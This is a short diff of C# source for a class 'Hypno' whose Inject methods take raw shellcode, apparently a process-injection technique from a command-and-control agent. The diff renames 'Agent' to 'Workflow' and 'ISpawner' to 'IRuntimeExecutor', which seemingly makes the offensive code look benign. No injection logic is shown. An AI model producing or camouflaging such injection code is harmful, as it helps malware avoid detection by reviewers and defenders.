@@ -1,18 +1,18 @@
-﻿using Agent.Interfaces;
-using Agent.Models;
+using Workflow.Contracts;
+using Workflow.Models;
 using Invoker.Dynamic;
 using Microsoft.Win32.SafeHandles;
 using System.Runtime.InteropServices;
 
 
-namespace Agent
+namespace Workflow
 {
     internal class Hypno : ITechnique
     {
         int ITechnique.id => 98; //Currently broken due to Debug issue and multithreading 
         private static readonly TaskScheduler _singleThreadScheduler = new ConcurrentExclusiveSchedulerPair().ExclusiveScheduler;
 
-        async Task<bool> Inject2(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> Inject2(IRuntimeExecutor spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             return await Task.Factory.StartNew(async () =>
             {
@@ -34,7 +34,7 @@ namespace Agent
             }, CancellationToken.None, TaskCreationOptions.None, _singleThreadScheduler).Unwrap();
         }
 
-        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> ITechnique.Inject(IRuntimeExecutor spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             spawnOptions.suspended = false;
 
